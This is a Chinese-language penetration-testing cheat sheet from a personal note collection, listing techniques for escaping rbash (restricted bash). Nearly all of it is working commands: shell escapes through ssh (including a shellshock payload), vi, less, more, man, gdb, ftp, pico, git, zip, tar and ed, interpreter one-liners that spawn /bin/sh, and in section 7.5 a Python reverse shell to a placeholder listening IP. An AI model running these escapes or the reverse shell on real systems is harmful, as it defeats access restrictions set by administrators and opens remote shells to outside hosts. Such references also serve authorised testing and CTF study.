---
{"created":"2024-12-02T17:19:22.722+08:00","tags":["rbash","shell"],"Type":"Note","dg-publish":true,"aliases":["rbash绕过"],"permalink":"/24-渗透/渗透姿势库/rbash绕过/","dgPassFrontmatter":true,"noteIcon":"2"}
---

参考文章
https://xz.aliyun.com/t/7642?time__1311=n4%2BxnD0DyDuDgDfxGqP05fb8KEoxoGbReD
https://www.freebuf.com/vuls/376922.html
## 1. 什么是rbash
- `RBASH` 是 Restricted BASH 的缩写，意思是受限制的 BASH。
- `RBASH` 是一种特殊的 shell，它限制了用户的一些操作和权限，例如：
- 不能使用 `cd` 命令来改变当前目录。
- 不能使用 `set` 命令来改变环境变量或 shell 选项。
- 不能使用 `unset` 命令来取消环境变量或 shell 函数。
- 不能使用任何包含 `/` 符号的命令，除非它们在 PATH 环境变量中指定了。
- 不能`重定向`输入或输出，例如使用 >, <, >>, << 等符号。
- 只能执行 PATH 环境变量中指定的命令，而且 PATH 环境变量通常只包含一些基本的命令，例如 ls, cat, echo 等。
- RBASH 的目的是为了提高系统的安全性，防止用户执行一些危险或不合法的操作。

## 2. 切换用户时逃逸
### 2.1. 使用 su命令
这里的原理涉及到su 和 su- 的区别：
- `su`命令，只会更改当前用户，而不会更改当前的用户环境，比如你从oracle 用户su到root账户中，当前路径仍是你刚才的路径，环境变量仍是oracle用户的
- `su- `命令，则在更改当前用户信息的同时还会更改用户环境，但是假如你从oracle 用户su -到root账户，你会发现你的当前路径已经变为/root/，环境变量也变了
```bash
su -l tw
su - tw
su --login tw
```
## 3. ssh登录时逃逸
### 3.1. 使用 ssh 命令
- 如果 RBASH 允许使用 ssh 命令，那么用户可以利用它的 -t 选项或 ProxyCommand 选项来执行 /bin/bash 或 /bin/sh。例如：

```bash
ssh username@IP -t "/bin/sh" or "/bin/bash"
ssh username@IP -t "bash --noprofile"
ssh username@IP -t "() { :; }; /bin/bash"   ###shellshock
```

- 这个方法的原理是：ssh 命令是一个用于远程登录和执行命令的工具。其中，-t 选项表示为远程命令分配一个伪终端（pseudo-terminal），ProxyCommand 选项表示使用一个代理程序来连接远程主机。因此，如果用户使用 -t 选项或 ProxyCommand 选项来执行 /bin/bash 或 /bin/sh，并指定 localhost 作为远程主机，就可以运行 bash 或 sh，并在本地显示它们的输出和交互界面，从而绕过 RBASH 的限制。

- 这个方法的优点是：比较巧妙，不需要复制或修改 bash 或 sh，也不需要使用其他的命令或工具，只要有 ssh 命令就可以。

- 这个方法的缺点是：需要使用 ssh 命令，如果 RBASH 禁止使用 ssh 命令，或者限制它的选项或参数，就无法使用这个方法。
## 4. 当前shell中逃逸
### 4.1. 特殊情况
- `/ `被允许的情况下；直接 /bin/sh 或 /bin/bash
- 能够设置PATH或SHELL时
```bash
export PATH=$PATH:/bin/:/usr/bin:$PATH
export SHELL=/bin/sh
```

权限足够时
```bash
cp /bin/sh /path/ ;sh
或
cp /bin/bash /path/ ;sh
```

### 4.2. 使用scp命令
```bash
scp -S /path/yourscript x y:
```
### 4.3. 使用 cp 命令

 如果 RBASH 允许使用 cp 命令，那么用户可以把 **/bin/bash 或 /bin/sh 复制到自己的目录下**，然后运行它们。例如：

```bash
rbash$ cp /bin/bash .
rbash$ ./bash
```

- 这个方法的原理是：RBASH 只限制了 PATH 环境变量中指定的命令，而不限制用户自己的目录下的命令。因此，如果用户把 bash 或 sh 复制到自己的目录下，就可以运行它们，从而绕过 RBASH 的限制。

- 这个方法的优点是：比较灵活，不需要知道 bash 或 sh 的绝对路径，只要能够复制它们就可以。

- 这个方法的缺点是：需要使用 cp 命令，如果 RBASH 禁止使用 cp 命令，或者限制用户的目录权限，就无法使用这个方法。


### 4.4. 使用 ftp, gdb, more, man, less, vim, rvim 等命令

- 如果 RBASH 允许使用 ftp, gdb, more, man, less, vim, rvim 等命令，那么用户可以在它们的交互模式下使用 !/bin/bash 或 !/bin/sh 来执行一个外部命令。例如：


```bash
rbash$ ftp
ftp> !/bin/bash
bash$ whoami
```

- 这个方法的原理是：这些命令都有一个交互模式，可以让用户输入一些子命令或选项来控制它们的行为。其中，! 是一个特殊的子命令，表示执行一个外部命令，而不是这些命令本身的功能。因此，如果用户输入 !/bin/bash 或 !/bin/sh，就可以执行 bash 或 sh，从而绕过 RBASH 的限制。
  
- 这个方法的优点是：比较隐蔽，不容易被 RBASH 发现和阻止，因为这些命令本身都是合法的，而且 ! 子命令不会在历史记录中显示。

- 这个方法的缺点是：需要使用这些命令中的一个，如果 RBASH 禁止使用这些命令，或者修改它们的行为或选项，就无法使用这个方法。

- 除了 ftp 命令之外，其他几种命令也可以用类似的方式来绕过 RBASH。以下是一些操作实例：


```bash
rbash$ gdb -q
(gdb) !/bin/bash
​
rbash$ more /etc/passwd
!/bin/bash
​
rbash$ man man
!/bin/bash
​
rbash$ less /etc/passwd
!/bin/bash
​
rbash$ vim -Z -c ':!/bin/bash'
```

rvim - 命令是用来启动一个受限制的 vim 编辑器的。其中，- 选项表示从标准输入读取文本，-Z 选项表示启动受限制的模式，-c 选项表示执行一个 vim 命令。因此，如果用户输入 rvim - -Z -c ‘:!/bin/bash’，就可以在 vim 的命令模式下使用 :!/bin/bash 来执行一个外部命令，从而绕过 RBASH 的限制。例如：

```bash
rbash$ rvim - -Z -c ':!/bin/bash'
```

### 4.5. 使用 vi 命令

- 如果 RBASH 允许使用 vi 命令，那么用户可以利用它的 :set shell=/bin/bash 命令来执行 /bin/bash。例如：

```bash
rbash$ vi
:set shell=/bin/bash
:shell
```

- 这个方法的原理是：vi 命令是一个经典的文本编辑器。其中，:set 命令表示设置一个选项的值，:shell 命令表示执行一个 shell。默认情况下，vi 会使用 RBASH 作为 shell，但是用户可以通过 :set shell=/bin/bash 来修改 shell 的值为 /bin/bash。因此，如果用户使用 :shell 命令，就可以运行 bash，从而绕过 RBASH 的限制。

- 这个方法的优点是：比较简单，不需要复制或修改 bash，也不需要使用其他的命令或工具，只要有 vi 命令就可以。

- 这个方法的缺点是：需要使用 vi 命令，如果 RBASH 禁止使用 vi 命令，或者限制它的选项或参数，就无法使用这个方法。


### 4.6. 使用 awk, find, expect, python, php, perl, lua, ruby 等编程语言或工具

- 如果 RBASH 允许使用 awk, find, expect, python, php, perl, lua, ruby 等编程语言或工具，那么用户可以利用它们的系统调用功能来执行 /bin/bash 或 /bin/sh。例如：


```bash
awk 'BEGIN {system("/bin/sh")}'
    或
        awk 'BEGIN {system("/bin/bash")}'
```

- 这个方法的原理是：这些编程语言或工具都有一些函数或方法，可以让用户在它们的环境中执行一个系统命令，并返回它的输出或状态。例如，awk 中的 system 函数，python 中的 os.system 函数，php 中的 shell_exec 函数等。因此，如果用户使用这些函数或方法来执行 /bin/bash 或 /bin/sh，就可以运行 bash 或 sh，从而绕过 RBASH 的限制。

- 这个方法的优点是：比较灵活，可以使用不同的编程语言或工具来实现相同的效果，只要 RBASH 允许使用它们就可以。

- 这个方法的缺点是：需要一定的编程知识和技巧，如果 RBASH 禁止使用这些编程语言或工具，或者限制它们的功能或参数，就无法使用这个方法。



### 4.7. 使用 pico 命令

- 如果 RBASH 允许使用 pico 命令，那么用户可以利用它的 -s 选项来执行 /bin/bash 或 /bin/sh。例如：

```bash
rbash$ pico -s /bin/bash
bash$ whoami
tom
bash$ pwd
/home/tom
bash$ cd /
bash$ pwd
/
```

- 这个方法的原理是：pico 命令是一个简单的文本编辑器。其中，-s 选项表示指定一个拼写检查程序来检查文档中的拼写错误。默认情况下，pico 会使用 spell 命令作为拼写检查程序，而 spell 命令是可以用来绕过 RBASH 的一个命令。因此，如果用户使用 -s 选项来指定 /bin/bash 或 /bin/sh 作为拼写检查程序，并打开一个空白的文档，就可以运行 bash 或 sh，并在本地显示它们的输出和交互界面，从而绕过 RBASH 的限制。

- 这个方法的优点是：比较巧妙，不需要复制或修改 bash 或 sh，也不需要使用其他的命令或工具，只要有 pico 命令就可以。

- 这个方法的缺点是：需要使用 pico 命令，如果 RBASH 禁止使用 pico 命令，或者修改它的拼写检查程序或选项，就无法使用这个方法。
## 5. 利用用户安装应用逃逸
### 5.1. ed-editor
```bash
ed
!'/bin/sh'
```
### 5.2. zip命令
```bash
zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
```
### 5.3. tar命令
```bash
tar cf /dev/null  filename  --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
### 5.4. 使用 git 命令

- 如果 RBASH 允许使用 git 命令，那么用户可以利用它的 help 子命令来执行 /bin/bash 或 /bin/sh。例如：

```bash
git help status 
!/bin/bash
```

- 这个方法的原理是：git 命令是一个用于版本控制和协作开发的工具。其中，help 子命令表示显示 git 的帮助信息，它会调用一个指定的帮助查看器来显示文档。默认情况下，git 会使用 less 命令作为帮助查看器，而 less 命令是可以用来绕过 RBASH 的一个命令。因此，如果用户使用 git help config 来显示 git config 的帮助信息，就可以在 less 的交互模式下使用 !/bin/bash 或 !/bin/sh 来执行一个外部命令，从而绕过 RBASH 的限制。

- 这个方法的优点是：比较隐蔽，不容易被 RBASH 发现和阻止，因为 git help config 看起来是一个合法的命令，而且 ! 子命令不会在历史记录中显示。

- 这个方法的缺点是：需要使用 git 命令，如果 RBASH 禁止使用 git 命令，或者修改它的帮助查看器或文档，就无法使用这个方法。
## 6. 利用编程语言环境绕过

### 6.1. python
```bash
python -c 'import os; os.system("/bin/sh")'
```

### 6.2. php
```bash
php -a then exec("sh -i");
```

### 6.3. perl
```bash
perl -e 'exec "/bin/sh";'
```

### 6.4. lua
```bash
os.execute('/bin/sh')
```

### 6.5. ruby
```bash
exec "/bin/sh"
```
### 6.6. expect
```bash
spwan sh
sh
```

## 7. 小tips
### 7.1. 比rbash更容易遇到的问题是当前路径异常问题
```bash
echo $PATH  ###一般很多命令基础执行不了的时候，都是路径异常，查看该值可验证    
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   ####修复
```
![assets/Pasted image 20241222132234.png](/img/user/24-%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/assets/Pasted%20image%2020241222132234.png)
### 7.2. 不能使用 > ，>>等字符重定向写文件
```bash
echo 'script code' | tee scriptfile
```
### 7.3. su切换用户逃逸时执行spawn shell命令
```bash
su -c "python -c  'import pty;pty.spawn(\"/bin/bash\")'" tw
```
### 7.4. ssh 登录时通过spawn shell逃逸
```bash
ssh username@IP  "export TERM=xterm;python -c  'import pty;pty.spawn(\"/bin/bash\")'"
```
### 7.5. 编程语言反弹shell
```python
python -c 'import       socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LISTENING IP",LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### 7.6. !'sh'
用的比较多的是 ` !/bin/sh ` 和 ` !/bin/bash`;其实还有一个 ` !'sh' ` --->由于没有了 ` '/' `；有时候能够达到很好的绕过效果
![assets/Pasted image 20241222132458.png](/img/user/24-%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/assets/Pasted%20image%2020241222132458.png)